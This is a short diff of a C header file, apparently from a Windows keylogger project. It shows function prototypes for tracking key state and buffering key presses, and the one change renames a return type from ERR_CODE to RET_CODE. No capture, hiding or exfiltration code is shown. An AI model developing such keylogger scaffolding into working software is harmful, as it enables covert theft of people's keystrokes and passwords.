@@ -41,7 +41,7 @@ void keyLoggerCleanup(KEY_LOGGER* kLogger); // cleanup keylogger memory
 // update the bool state variables based on the key pressed, returns whether an update occurred
 BOOL updateKeyLoggerState(KEY_LOGGER* kLogger, WPARAM wParam, LPDWORD vkCode);
 // method to add the content of a key press to the keyBuffer 
-ERR_CODE addKeyPressToBuffer(KEY_LOGGER* kLogger, LPDWORD vkCode);
+RET_CODE addKeyPressToBuffer(KEY_LOGGER* kLogger, LPDWORD vkCode);
 
 void resetKLBufferAndKey(KEY_LOGGER* kLogger, char key);
 
